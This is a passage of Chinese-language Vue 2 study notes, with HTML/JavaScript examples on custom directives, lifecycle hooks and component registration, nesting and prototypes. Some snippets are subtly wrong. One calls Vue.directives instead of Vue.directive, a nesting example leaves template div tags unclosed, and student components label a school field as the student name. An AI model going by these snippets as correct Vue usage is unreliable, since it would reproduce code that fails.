					2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。
    -->
    <h2 v-pre>Vue其实很简单</h2>
    <h2>当前的n值为:{{ n }}</h2>
    <button @click="n++">带我n+1</button>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false;
    new Vue({
        el:"#root",
        data:{
           n:1
        }
    })
</script>
</body>
</html>
```

---

### 自定义指令-函数式

![image](452973915B78492B89F9F9086DE8D0EC)

```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <script src="./Vue/vue.js"></script>
    <script src="https://cdn.bootcdn.net/ajax/libs/dayjs/1.11.7/dayjs.min.js"></script>
    <title>Document</title>
    <style></style>
  </head>
  <body>
    <div id="root">
      <h2>当前的n值是：<span v-text="n"></span></h2>
      <h2>放大的n值是：<span v-big="n"></span></h2>
    </div>
    <script>
      const vm = new Vue({
        el: "#root",
        data: {
          n: 1,
        },
        directives: {
          big(htmlElement, binding) {
            htmlElement.innerText = binding.value * 10;
          },
        },
      });
    </script>
  </body>
</html>
```

```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Document</title>
    <script src="vue.js"></script>
  </head>
  <body>
    <div id="root">
      <h1 v-big="n">hello, {{name}}</h1>
    </div>

    <script>
      new Vue({
        el: "#root",
        data: {
          name: "mike",
          n: 1,
        },
        directives: {
          // 1、big函数会被调用
          // 2、指令所在的模板会被重写解析
          // Element代表被绑定的元素对象
          // binding代表指令后面的值
          big(Element, binding) {
            Element.innerText = binding.value * 10;
          },
        },
      });
    </script>
  </body>
</html>
```

总结

```
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>自定义指令</title>
    <script src="../js/vue.js"></script>
</head>
<body>
<!--
   需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。
   需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。
   自定义指令总结：
			一、定义语法：
						(1).局部指令：
							new Vue({directives:{指令名:配置对象} })   或  new Vue({directives: {指令名:回调函数}})
						(2).全局指令：
							Vue.directive(指令名,配置对象) 或  Vue.directive(指令名,回调函数)

			二、配置对象中常用的3个回调：
						(1).bind：指令与元素成功绑定时调用。
						(2).inserted：指令所在元素被插入页面时调用。
						(3).update：指令所在模板结构被重新解析时调用。

			三、备注：
				         1.指令定义时不加v-，但使用时要加v-；
						 2.指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。
-->
<!--
  下面的这是模版，要经过vue的解析才能放到页面中，dom树里
-->
<div id="root">
    <h2>当前的n值是：<span v-text="n"></span></h2>
<!--    <h2>放大10倍后的n值是: <span v-big-number="n"></span></h2>-->
    <h2>放大10倍后的n值是: <span v-big="n"></span></h2>
    <button @click="n++">点我n+1</button>
    <p>测试指令函数所调用的时机: {{ name }} </p>
    <hr/>
    <input type="text" v-fbind:value="n"/>
</div>
<div id="root2">
    <input type="text" v-fbind:value="x"/>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false;
    //此时自定义fbind指令使全局指令了，其他vue实例所管理的容器也可以使用
    //全局指令
    Vue.directive('fbind', {
        bind(el, binding){
            // console.log('bind')
            el.value = binding.value;
        },
        //指令被插入页面时
        inserted(el, binding){
            // console.log('inserted')
            el.focus();
        },
        //指令所在模版被重新解析时
        update(el, binding){
            // console.log('update');
            el.value = binding.value;
        }
    })
    const vm = new Vue({
        el:"#root",
        data:{
            name: '上海',
            n:1
        },
        //定义指令的配置项: directives
        directives:{
            /**
             big函数的调用时机:
                    1.指令与元素成功绑定(但注意此时dom元素还没有成功的被弄到页面上去)时会被调用 (首次,类似于dom元素一加载)
                    2.指令所在的模版被重新解析时会被再次调用
            **/
            //两种写法:1.对象(key-value) 2.函数
            // 'big-number'(el,binding){
            //     console.log('big被调用啦！')
            //     //收到两个参数，第一个参数代表真实dom元素，第二个参数是绑定对象，关注该绑定对象中的value属性
            //     // console.log(el,binding);
            //     //原生dom的操作
            //     el.innerText = binding.value * 10;
            // },
            big(el,binding){
                console.log(this); //注意此处this===window vue实例对象此时'不管'你写在指令里面的函数了
                console.log('big被调用啦！')
                //收到两个参数，第一个参数代表真实dom元素，第二个参数是绑定对象，关注该绑定对象中的value属性
                // console.log(el,binding);
                //原生dom的操作
                el.innerText = binding.value * 10;
            },
            //自定义fbind绑定
            //换成对象写法 对比函数简写方式其实只是多了 inserted钩子
            // fbind:{
            //     //指令与元素成功绑定
            //     // bind(el, binding){
            //     //     // console.log('bind')
            //     //     el.value = binding.value;
            //     // },
            //     // //指令被插入页面时
            //     // inserted(el, binding){
            //     //     // console.log('inserted')
            //     //     el.focus();
            //     // },
            //     // //指令所在模版被重新解析时
            //     // update(el, binding){
            //     //     // console.log('update');
            //     //     el.value = binding.value;
            //     // }
            // }
        }
    });

    const vm2 = new Vue({
        el:'#root2',
        data:{
            x: 1,
        }
    })
</script>
</body>
</html>
```

---

### 自定义指令-对象式

![image](452973915B78492B89F9F9086DE8D0EC)

```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Document</title>
    <script src="vue.js"></script>
  </head>
  <body>
    <div id="root">
      <h1 v-big="n">hello, {{name}}</h1>
    </div>

    <script>
      new Vue({
        el: "#root",
        data: {
          name: "mike",
          n: 1,
        },
        directives: {
          // 1、big函数会被调用
          // 2、指令所在的模板会被重写解析
          big: {
            // 指令与元素成功绑定时执行
            bind() {
                console.log("bind")
            },
            // 指令所在元素被插入页面时执行
            inserted(Ele, binding) {
                console.log("inserted")
            },
            // 指令所在模板被重写解析时执行
            update(Ele, binding) {
                console.log("update")
            }
          }
        },
      });
    </script>
  </body>
</html>
```

---

### 自定义指令-总结

```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Document</title>
    <script src="vue.js"></script>
  </head>
  <body>
    <div id="root">
      <h1 v-big="n">hello, {{name}}</h1>
    </div>

    <script>
      // 定义全局指令
      Vue.directives("big", {
        // 指令与元素成功绑定时执行
        bind() {
          console.log("bind");
        },
        // 指令所在元素被插入页面时执行
        inserted(Ele, binding) {
          console.log("inserted");
        },
        // 指令所在模板被重写解析时执行
        update(Ele, binding) {
          console.log("update");
        },
      });
      new Vue({
        el: "#root",
        data: {
          name: "mike",
          n: 1,
        },
      });
    </script>
  </body>
</html>
```

---

### 生命周期

```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Document</title>
    <script src="vue.js"></script>
  </head>
  <body>
    <div id="root">
      <h1 :style="{opacity}">hello world.{{change()}}</h1>
    </div>

    <script>
      new Vue({
        el: "#root",
        data: {
          opacity: 1,
        },
        methods: {
          change() {
            console.log("创建定时器")
            setInterval(() => {
              this.opacity -= 0.01;
              if (this.opacity <= 0) this.opacity = 1;
            }, 16);
          },
        },
      });
    </script>
  </body>
</html>
```

页面的数据更新的时候，重写解析模板，导致执行change()函数。

```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Document</title>
    <script src="vue.js"></script>
  </head>
  <body>
    <div id="root">
      <h1 :style="{opacity}">hello world.{{change()}}</h1>
    </div>

    <script>
      new Vue({
        el: "#root",
        data: {
          opacity: 1,
        },
        // Vue把模板解析完毕后，并把初始的真实DOM放入页面中执行
        mounted() {
            console.log("mounted");
        }
      });
    </script>
  </body>
</html>
```

```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Document</title>
    <script src="vue.js"></script>
  </head>
  <body>
    <div id="root">
      <h1 :style="{opacity}">hello world.</h1>
    </div>

    <script>
      new Vue({
        el: "#root",
        data: {
          opacity: 1,
        },
        // Vue把模板解析完毕后，并把初始的真实DOM放入页面中执行
        // Vue对象自动调用
        mounted() {
            console.log("mounted");
            console.log(this)
        }
      });
    </script>
  </body>
</html>
```

---

###  挂载过程

```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Document</title>
    <script src="vue.js"></script>
  </head>
  <body>
    <div id="root">
      <h2>当前的n值是：{{n}}</h2>
      <button @click="add">加1</button>
    </div>

    <script>
      new Vue({
        el: "#root",
        data: {
          n: 1,
        },
        methods: {
          add() {
            console.log("add");
            this.n++;
          },
        },
        beforeCreate() {
          // 无法访问数据和方法
          // 模板没有被解析
          console.log(this);
          debugger;
        },
      });
    </script>
  </body>
</html>
```

实例

```
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>生命周期函数(钩子)</title>
    <script src="../js/vue.js"></script>
</head>
<body>
<div id="root">
    <!--
			生命周期：
				1.又名：生命周期回调函数、生命周期函数、生命周期钩子。
				2.是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数。
				3.生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的。
			    4.生命周期函数中的this指向是vm 或 组件实例对象。
	-->
    <h1 v-if="a">你好啊</h1>
    <!--v-bind绑定-->
    <h1 :style="{opacity}">欢迎学习vue</h1>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false;
    const vm = new Vue({
        el:"#root",
        data:{
            opacity: 1,
            a:true
        },
        methods:{
        },

        //mounted
        //vue完成模版的解析并把初始的真实的dom元素挂载完毕就调用mounted函数
        //只调用一次
        mounted(){
            //关键性时刻调用对应的函数 生命周期
            console.log('mounted');
            const timer = setInterval(() => {
                //剪头函数没有this会从外部作用域寻找 mounted是由vue管理的函数，所以该函数中的this是vm(vue实例对象)
                this.opacity -= 0.01;
                if(this.opacity <= 0) this.opacity = 1;
            },16);
        }
    });

    //通过外部的定时器实现，不推荐
    // setInterval(() => {
    //     vm.opacity -= 0.01;
    //     if( vm.opacity <= 0) vm.opacity = 1;
    // }, 16);
</script>
</body>
</html>
```

```
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>分析vue中生命周期</title>
    <script src="../js/vue.js"></script>
</head>
<body>
<div id="root" :x="n">
    <h1>当前的n值是{{ n }}</h1>
    <h1 v-text="n"></h1>
    <button @click="add">点我+1</button>
    <button @click="bye">点我销毁vm</button>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false;
    new Vue({
        el:"#root",
        //template模版字符串只能有一个根结点
        // template:'<div><h1>当前的n值是{{ n }}</h1>\n' +
        //     '<button @click="add">点我+1</button></div>',
        //注意template是不能作为根标签来使用的，不能去骗vue，可以用fragment(vue3新加，模仿react)
        data: {
            n: 1
        },
        methods:{
            add(){
                console.log('add')
                this.n++;
            },
            bye(){
                //实例销毁后调用。该钩子被调用后，对应 Vue 实例的所有指令都被解绑，所有的(自定义)事件监听器被移除，所有的子实例也都被销毁。
                console.log('bye');
                this.$destroy();
            }
        },
        watch:{
            n(){
                console.log('n变了');
            }
        },
        beforeCreate(){
            console.log('beforeCreate');
            // console.log(this);

        },
        created(){
            console.log('created');
            // console.log(this);
        },
        beforeMount(){
            console.log('beforeMount');
            // console.log(this);
        },
        mounted(){
            console.log('mounted');
            console.log(this);
            // document.querySelector('h1').innerText = 'hahah';
        },
        beforeUpdate(){
            console.log('beforeUpdate');
            //console.log(this.n); //此时数据是新的，页面还是旧的，vue还没根据新的数据去生成新的虚拟dom，去比较旧的虚拟dom
        },
        updated(){
            console.log('updated');
            console.log(this.n); //此时数据是新的，页面也是新的，同步
        },
        beforeDestroy(){
            //仍然可以使用data,methods，关闭定时器，取消订阅消息，解绑自定义事件等收尾工作，移除watchers
            console.log('beforeDestroy');
            console.log(this.n);
            // this.add(); //记住一旦到了beforeDestroy或者destroyed钩子，即使你拿到数据想要更新它也不会走更新的路了(beforeUpdate,updated)
        },
        //destroyed钩子几乎不用
        destroyed(){
          console.log('destroyed');
        }
    });


</script>
</body>
</html>
```

```
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>生命周期函数(钩子)总结</title>
    <script src="../js/vue.js"></script>
</head>
<body>
<div id="root">
    <!--
			常用的生命周期钩子：
				1.mounted: 发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】。
				2.beforeDestroy: 清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。

			关于销毁Vue实例
				1.销毁后借助Vue开发者工具看不到任何信息。
				2.销毁后自定义事件会失效，但原生DOM事件依然有效。(click之类的原生事件依然会被调用)
			    3.一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了。
	-->
    <!--v-bind绑定-->
    <h1 :style="{opacity}">欢迎学习vue</h1>
    <button @click="stop">停止变换</button>
    <button @click="opacity = 1">透明度设置为1</button>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false;
    const vm = new Vue({
        el:"#root",
        data:{
            opacity: 1,
        },
        methods:{
            stop() {
                //只是清除了定时器，响应式仍然存在
                // clearInterval(this.timer);
                //暴力杀
                this.$destroy();
            }
        },

        //mounted
        //vue完成模版的解析并把初始的真实的dom元素挂载完毕就调用mounted函数
        //只调用一次
        mounted(){
            //关键性时刻调用对应的函数 生命周期
            console.log('mounted');
            this.timer = setInterval(() => {
                console.log('inter')
                //剪头函数没有this会从外部作用域寻找 mounted是由vue管理的函数，所以该函数中的this是vm(vue实例对象)
                this.opacity -= 0.01;
                if(this.opacity <= 0) this.opacity = 1;
            },16);
        },

        beforeDestroy() {
            console.log('vm要没了')
            clearInterval(this.timer);
        }
    });

</script>
</body>
</html>
```

---

### 身命周期总结

![image](7758206DBB05474CB38FB2622733EA2F)

![image](11737CC116EF400C8975D71512045260)

---

### 对组件的理解

![image](65EBE49DEF814EB0B55622373E7CEEB4)

组件方式编写应用

![image](122015523AC541BEA2FA881139029C64)

![image](6CD7F85A985445859E0CA343E561E81C)

![image](DCD5E5BA8D09470C986744D724DB0344)

---

### 非单文件组件

![image](1F95E3EFD30047ACB5D0BFF326508951)

组件方式实现：

```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <script src="./Vue/vue.js"></script>
    <title>Document</title>
    <style></style>
  </head>
  <body>
    <div id="root">
      <!-- 使用school_component和student_component组件 -->
      <school_component></school_component>
      <student_component></student_component>
    </div>
    <script>
      // 创建school组件
      const school = Vue.extend({
        template: `
          <div>
            <h2>学校名称：{{school}}</h2>
            <h2>学校地址：{{address}}</h2>
          </div>
        `,
        data() {
          return {
            school: "武汉",
            address: "武汉",
          };
        },
      });

      // 创建student组件
      const student = Vue.extend({
        template: `
          <div>
            <h2>学生名称：{{school}}</h2>
            <h2>学生地址：{{address}}</h2>
          </div>
        `,
        data() {
          return {
            school: "武汉",
            address: "武汉",
          };
        },
      });

      // 创建Vue对象
      new Vue({
        el: "#root",
        // 注册组件
        components: {
          school_component: school,
          student_component: student,
        },
      });
    </script>
  </body>
</html>
```

```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <script src="./Vue/vue.js"></script>
    <title>Document</title>
    <style></style>
  </head>
  <body>
    <div id="root">
      <!-- 使用school_component和student_component组件 -->
      <school_component></school_component>
      <hr />
      <student_component></student_component>
      <hr />
    </div>

    <div id="root2">
      <!-- 使用school_component和student_component组件 -->
      <school_component></school_component>
      <hr />
      <student_component></student_component>
    </div>
    <script>
      // 创建school组件
      const school = Vue.extend({
        template: `
          <div>
            <h2>学校名称：{{school}}</h2>
            <h2>学校地址：{{address}}</h2>
            <button @click="showName">点我</button>
          </div>
        `,
        data() {
          return {
            school: "武汉",
            address: "武汉",
          };
        },
        methods: {
          showName() {
            alert(this.school);
          },
        },
      });

      // 创建student组件
      const student = Vue.extend({
        template: `
          <div>
            <h2>学生名称：{{school}}</h2>
            <h2>学生地址：{{address}}</h2>
          </div>
        `,
        data() {
          return {
            school: "武汉",
            address: "武汉",
          };
        },
      });

      // 创建Vue对象
      new Vue({
        el: "#root",
        // 注册组件
        components: {
          school_component: school,
          student_component: student,
        },
      });
      
      // 创建Vue对象
      new Vue({
        el: "#root2",
        // 注册组件
        components: {
          school_component: school,
          student_component: student,
        },
      });
    </script>
  </body>
</html>
```

```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <script src="./Vue/vue.js"></script>
    <title>Document</title>
    <style></style>
  </head>
  <body>
    <div id="root">
      <!-- 使用school_component和student_component组件 -->
      <school_component></school_component>
      <hr />
      <student_component></student_component>
      <hr />
    </div>

    <div id="root2">
      <!-- 使用school_component和student_component组件 -->
      <school_component></school_component>
      <hr />
      <student_component></student_component>
    </div>
    <script>
      // 创建school组件
      const school = Vue.extend({
        template: `
          <div>
            <h2>学校名称：{{school}}</h2>
            <h2>学校地址：{{address}}</h2>
            <button @click="showName">点我</button>
          </div>
        `,
        data() {
          return {
            school: "武汉",
            address: "武汉",
          };
        },
        methods: {
          showName() {
            alert(this.school);
          },
        },
      });

      // 创建student组件
      const student = Vue.extend({
        template: `
          <div>
            <h2>学生名称：{{school}}</h2>
            <h2>学生地址：{{address}}</h2>
          </div>
        `,
        data() {
          return {
            school: "武汉",
            address: "武汉",
          };
        },
      });

      // 创建Vue对象
      new Vue({
        el: "#root",
        // 注册组件
        components: {
          student_component: student,
        },
      });

      new Vue({
        el: "#root2",
        // 注册组件
        components: {
          student_component: student,
        },
      });

      // 全局注册组件
      Vue.component("school_component", school);
    </script>
  </body>
</html>
```

总结

```
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>非单文件组件的基本使用</title>
    <script src="../js/vue.js"></script>
</head>
<body>
<!--
			Vue中使用组件的三大步骤：
					一、定义组件(创建组件)
					二、注册组件
					三、使用组件(写组件标签)

			一、如何定义一个组件？
						使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；
						区别如下：
								1.el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。
								2.data必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系。
						备注：使用template可以配置组件结构。

			二、如何注册组件？
							1.局部注册：靠new Vue的时候传入components选项
							2.全局注册：靠Vue.component('组件名',组件)

			三、编写组件标签：
							<school></school>
-->
<div id="root">
    <h1>
        {{ msg }}
    </h1>
    <hello></hello>
    <!--使用组件-->
    <school></school>
    <hr/>
    <student></student>
    <hr/>
</div>
<div id="root2">
   <h2>root2容器</h2>
    <hello></hello>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false;

    //全部注册

    /**
     * 想用组件的三个步骤
     * 1.创建组件
     * 2.注册组件
     * 3.使用组件
     */
        //创建school组件
    const school = Vue.extend({
            template: `
              <div>
              <h2>学校名称:{{ schoolName }}</h2>
              <h2>学校地址:{{ address }}</h2>
              <button @click="showName">点我提示学校名</button>
              </div>
            `,
            //组件定义不要写el配置项，因为最终所有的组件都要被vm所管理，由vm决定服务于哪个容器
            //这里data必须写成函数形式 避免多次使用组件导致共用data对象导致一个问题
            data() {
                //注意这里不要写箭头函数
                return {
                    schoolName: '武汉科技大学',
                    address: '武汉',
                }
            },
            methods:{
                showName(){
                    alert(this.schoolName)
                }
            }
        })
    //创建school组件
    const student = Vue.extend({
        template: `
            <div>
              <h2>学生名字:{{ studentName }}</h2>
              <h2>学生年龄:{{ age }}</h2>
            </div>
        `,
        data() {
            return {
                studentName: 'Jone',
                age: 18
            }
        }
    });


    const hello = Vue.extend({
        template:`
          <div>
            <h2>你好世界,{{ name }}</h2>
          </div>
        `,
        data(){
            return {
                name: 'panyue'
            }
        }
    });

    //hello组件
    Vue.component('hello', hello); //全局注册hello 就代表所有的vm都可以用hello组件了

    // 创建vm
    new Vue({
        el: "#root",
        //配置组件(局部注册)
        data:{
            msg: 'hello world'
        },
        components: {
            school,
            student
        },
    })

    new Vue({
       el: '#root2',
    });

</script>
</body>
</html>
```

---

### 组件注意点

![image](1A847BEE36524C8CBE53A0B0A7CC1457)

```
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>几个基本的注意点</title>
    <script src="../js/vue.js"></script>
</head>
<body>
<div id="root">
    <!--
			几个注意点：
					1.关于组件名:
								一个单词组成：
											第一种写法(首字母小写)：school
											第二种写法(首字母大写)：School
								多个单词组成：
											第一种写法(kebab-case命名)：my-school
											第二种写法(CamelCase命名)：MySchool (需要Vue脚手架支持)
								备注：
										(1).组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行。
										(2).可以使用name配置项指定组件在开发者工具中呈现的名字。

					2.关于组件标签:
								第一种写法：<school></school>
								第二种写法：<school/>
								备注：不用使用脚手架时，<school/>会导致后续组件不能渲染。

					3.一个简写方式：
								const school = Vue.extend(options) 可简写为：const school = options
		-->
    <h1>{{ msg }}</h1>
    <hello></hello>
<!--    <school/>-->
<!--    <school/>-->
<!--    <school/>-->
    <school></school>
    <school></school>
    <school></school>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false;

    const s = Vue.extend({
        template: `
          <div>
            <h2>学校名称:{{ name }}</h2>
            <h2>学校地址:{{ address }}</h2>
          </div>
        `,
        data(){
            return {
                name: '武汉科技大学',
                address: '武汉'
            }
        },
        name: 'test' //该配置是指定组件在开发者工具中指定的名称
    });

    //创建组件的简写 (不需要vue.extend)
    const hello = {
        template: `
          <div>
            <h1>{{ msg }}</h1>
         </div>
        `,
        data(){
            return {
                msg:"hello"
            }
        }
    }



    new Vue({
        el: "#root",
        data:{
          msg: '欢迎学习vue'
        },
        components:{
            school:s,
            hello
        }
    })
</script>
</body>
</html>
```

---

### Vue组件的嵌套

一个组件中嵌套另一个组件。

```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Document</title>
  </head>
  <body>
    <div id="root">
      <school></school>
      {{msg}}
    </div>
    <script src="vue.js"></script>
    <script>
      // 定义组件
      const student = Vue.extend({
        template: `
                <div>hello,{{name}}
            `,
        data() {
          return {
            name: "jack",
          };
        },
      });

      // 定义组件
      const school = Vue.extend({
        template: `
                <div>hello,{{school}}
                <student></student>
            `,
        data() {
          return {
            name: "mike",
          };
        },
        components: {
          student: student,
        },
      });

      new Vue({
        el: "#root",
        data: {
          msg: "hello",
        },
        // 注册组件
        components: {
          school: school,
        },
      });
    </script>
  </body>
</html>
```

```
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>组件的嵌套</title>
    <script src="../js/vue.js"></script>
</head>
<body>
<div id="root" :x="x">
    <!--组件的嵌套-->
<!--    <school>-->
<!--    </school>-->
<!--    <hello></hello>-->
<!--    <app></app>-->
</div>
<script type="text/javascript">
    Vue.config.productionTip = false;

    const student = Vue.extend({
        template: `
           <div>
              <h2>学生姓名:{{ name }}</h2>
              <h2>学生年龄:{{ age }}</h2>

           </div>
        `,
        data(){
            return {
                name: 'JONE',
                age:13
            }
        },
    });

    const school = Vue.extend({
        template: `
          <div>
             <h1>学校名称:{{ name }}</h1>
             <h1>学校地址:{{ address }}</h1>
             <!--子组件注册给哪个父组件，就嵌套在哪个副组件里面--->
             <student></student>
          </div>
        `,

        data(){
            return {
                name: '武汉科技大学',
                address:'武汉'
            }
        },

        //组件嵌套
        //这里也是局部注册组件
        components: {
           student
        }
    });


      const hello = Vue.extend({
          template: `<h1>{{ msg }}</h1>`,
          data(){
              return {
                  msg: 'hello, my vue world',
              }
          },
      });


      const app = Vue.extend({
          template:`<div>
            <school></school>
            <hello></hello>
          </div>`,
          components:{
              school,
              hello
          }
      });

        new Vue({
        template: `<app></app>`,
        el:"#root",
        //注册组件(局部)
        components:{
            // //schoo组件与hello组件平级
            // school,
            // hello
            app,
        },
        data:{
            x:1,
        }
    });


</script>
</body>
</html>
```

---

### VueConponent构造函数

![image](97DBAEBAA2074C20AAD64D1A8C6508DB)

```
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>VueComponent</title>
    <script src="../js/vue.js"></script>
</head>
<body>
<!--
			关于VueComponent：
						1.school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的。

						2.我们只需要写<school/>或<school></school>，Vue解析时会帮我们创建school组件的实例对象，
							即Vue帮我们执行的：new VueComponent(options)。

						3.特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent！！！！注意这一点很重要

						4.关于this指向：
								(1).组件配置中：
											data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【VueComponent实例对象】。
								(2).new Vue(options)配置中：
											data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】。

						5.VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）。
							Vue的实例对象，以后简称vm。 vm管理着一个又一个vc，vc可以再
					    6.因为组件是可复用的 Vue 实例，所以它们与 new Vue 接收相同的选项，例如 data、computed、watch、methods 以及生命周期钩子等。仅有的例外是像 el 这样根实例特有的选项。
					      所以vm与vc属性配置并不是一模一样，尽管vc底层复用了很多vm的逻辑
-->
<div id="root">
    <school></school>
    <hello>
    </hello>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false;

    const school = Vue.extend({
        template: `
          <div>
             <h1>学校名称:{{ name }}</h1>
             <h1>学校地址:{{ address }}</h1>
             <button @click="showname">点我提示学校名</button>
          </div>
        `,
        data(){
            return {
                name: '武汉科技大学',  //vuecomponent的实例对象
                address:'武汉'
            }
        },
        methods:{
            showname(){
              console.log(this);
              console.log(this.name);
           }
        }
    });

    // console.log(typeof school, school); //所谓的组件就是构造函数(VueComponent);


    //测试组件
    const test = Vue.extend({
       template:  `<h1>panyue</h1>`
    });

    //hello组件
    const hello = Vue.extend({
        template:`
          <div>
          <h1>{{ msg }}</h1>
          <test></test>
        </div>`,
        data(){
            return {
                msg: '你好'
            }
        },
        components: {
            test
        }
    })


    const vm = new Vue({
        el:"#root",
        components:{
            school,
            hello
        }
    });

    //验证school与hello并不是同一个VueComponent构造函数
    // school.a = 99;
    // console.log('@', school);
    // console.log('#', hello);
    // console.log(school === hello);
    // console.log(school.a, hello.a);
</script>
</body>
</html>
```
---

### Vue实例与组件实例

![image](E4391CA9DBA746148D8EBC6ABD7F549E)

---

### 一个重要的内置关系

![image](17B8D4E246FE4E7095F6CBD1074C80EF)

```
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>一个重要的内置</title>
    <script src="../js/vue.js"></script>
</head>
<body>
<!--
			1.一个重要的内置关系：VueComponent.prototype.__proto__ === Vue.prototype
			2.为什么要有这个关系：让组件实例对象（vc）可以访问到 Vue原型上的属性、方法。
-->
<div id="root">
    <!--new VueComponent只有在你写了<school/>或者<school></school>才会执行-->
    <school></school>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false;
    //一个内置关系
    Vue.prototype.x = 99;
    //注意 VueComponent.prototype.__proto__ === Vue.prototype === vm.__proto__

    const school = Vue.extend({
        template: `
          <div>
             <h1>学校名称:{{ name }}</h1>
             <h1>学校地址:{{ address }}</h1>
             <button @click="showname">点我提示学校名</button>
             <button @click="cx">点我输出x</button>
          </div>
        `,
        data(){
            return {
                name: '武汉科技大学',  //vuecomponent的实例对象
                address:'武汉'
            }
        },
        methods:{
            showname(){
                console.log(this);
                console.log(this.name);
            },
            cx(){
